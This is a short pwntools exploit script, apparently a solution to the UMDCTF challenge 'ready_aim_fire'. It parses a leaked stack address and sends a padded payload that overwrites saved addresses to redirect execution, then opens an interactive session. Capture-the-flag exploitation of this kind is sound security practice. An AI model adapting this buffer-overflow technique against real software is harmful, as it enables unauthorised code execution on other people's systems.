from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./ready_aim_fire"
# libc = ELF("")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.umdctf.io", 31008 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x00000000004028c4
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)


r = start()

pf = 0x0000000000402509
bk_main = 0x4026be

ru(b"laser cannon!\n")
stack = int(rl().strip(), 16)
ic(hex(stack))


sl(cyclic(0x34-8) + p64(stack + 20) + p64(bk_main) + cyclic(0x20) + p64(1) + p64(0x000000000040201a) + p64(pf))

r.interactive()
